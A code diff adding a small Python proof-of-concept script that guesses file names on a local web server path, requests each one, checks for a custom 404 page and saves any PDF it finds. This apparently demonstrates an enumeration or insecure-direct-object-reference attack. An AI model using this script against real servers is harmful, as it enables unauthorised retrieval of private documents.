@@ -1,0 +1,20 @@
+# ----- POC Script | python3 ------#
+
+def pdf_extractor(payload):
+   url = 'http://127.0.0.1:1080/FileAlertas/omisidad/omisidad'
+   search_results = requests.get(url + payload + ".pdf")
+   html_soup = BeautifulSoup(search_results.content,'html.parser', from_encoding="iso-8859-1")
+   meta_tag = html_soup.find_all('span')
+
+   meta_string = '<span><strong>Oops</strong> Error 404!</span>'
+
+   for tag in meta_tag:
+       if meta_string in tag.__str__():
+           return False
+       else:
+           pass
+   with open(payload+'.pdf', 'wb') as pdf:
+       pdf.write(search_results.content)
+       return True
+
+# ----- POC Script | python3 ------#
